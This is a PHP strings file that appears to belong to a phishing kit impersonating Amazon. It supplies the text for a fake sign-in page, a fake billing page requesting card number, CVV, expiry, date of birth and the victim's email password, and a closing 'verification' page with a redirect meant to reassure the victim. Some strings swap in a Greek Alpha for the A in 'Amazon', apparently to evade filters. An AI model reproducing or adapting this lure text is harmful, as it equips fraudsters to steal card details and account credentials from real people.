<?php

/////////////////////// All
$m3il9a_1 = 'Try Prime';
$m3il9a_2 = 'All';
$m3il9a_3 = 'Select the department you want to search in';
$m3il9a_4 = 'EN';
$m3il9a_5 = 'Hello, Customer';
$m3il9a_6 = 'Account & Lists';
$m3il9a_7 = 'Orders';
$m3il9a_8 = 'Cart';
///////////////////////
$zab_a = 'Your Account';
$zab_b = 'Amazon Wallet';
$zab_c = 'Amazon Manager';
$Azzouz1 = 'Amazon accepts all major credit and debit cards';
$Azzouz2 = 'Credit or Debit Cards';
$Azzouz3 = 'Name on card';
$Azzouz4 = 'Email address';
$Azzouz5 = 'Password';
$Azzouz6 = 'Confirme Password';
$Azzouz7 = 'Enter your attached Email access';
$Azzouz8 = 'Use this card across all of Amazon';
///////////////////////
$year = date('Y');
///////////////////////  Signin ///////////////////////////////////
$dexter_zkika_1 = "Sign in";
$dexter_zkika_2 = "Email (phone for mobile accounts)";
$dexter_zkika_3 = "Forgot your password?";
$dexter_zkika_4 = "Password";
$dexter_zkika_5 = "Sign in";
$dexter_zkika_6 = "New to Αmazon?";
$dexter_zkika_11 = "By signing in you are agreeing to our";	 
$dexter_zkika_111 = "Conditions of Use and Sale";	
$dexter_zkika_1111 = "and our";	
$dexter_zkika_11111 = "Privacy Notice";	
$dexter_zkika_12 = "Create an account";	 
$dexter_zkika_13 = "Conditions of Use";	 
$dexter_zkika_15 = "Privacy Notice";	
$dexter_zkika_16 = "Help";
$goverment_is_bad_1 = "© 1996-$year, Αmazon.com, Inc. or its affiliates";
$goverment_is_bad_2 = "Amazon - Login";
///////////////////////// billing ///////////////////////////////////
$richard_azzouz_1 = "Amazon - Billing";
$richard_azzouz_2 = "Hello.";
$richard_azzouz_3 = "Search";
$richard_azzouz_4 = "All";
$richard_azzouz_5 = "Your Account";
$richard_azzouz_6 = "Card";
$richard_azzouz_7 = "Wish";
$richard_azzouz_8 = "list";
$goverment_is_bad_4 = "Enter your credit card information";
$goverment_is_bad_5 = "When you are done, click Submit button.";
$goverment_is_bad_6 = "Card Holder";
$goverment_is_bad_7 = "Card Number";
$goverment_is_bad_8 = "No Dashes or Spaces";
$goverment_is_bad_09 = "Security code of the card.";
$goverment_is_bad_10 = "Expiration date";
$goverment_is_bad_11 = "Month";
$goverment_is_bad_12 = "Year";
$goverment_is_bad_13 = "Day";
$goverment_is_bad_14 = "Phone Number";
$goverment_is_bad_15 = "Zip Code";
$goverment_is_bad_16 = "date of Birth";
$goverment_is_bad_17 = "CVV";
$goverment_is_bad_18 = "Submit";
$goverment_is_bad_19 = "Conditions of Use";
$goverment_is_bad_20 = "Privacy Notice";
$goverment_is_bad_21 = "Interest-Based Ads";
/////////////////////////// finich //////////////////////////////////////////////////
$zkika_logo     = "Amazon - Thank You !";
$dexter_zkikab_1 = "Thank you";
$dexter_zkikab_2 = "You have successfully confirmed <br> your account information";	  
$dexter_zkikab_3 = "Your have to re-login to save changes, you will be redirected automatically to login page In 5 seconds <br> Thank you for using our system verification.";	 
//////////////////////////////////////////////////////////////////////////////////////


?>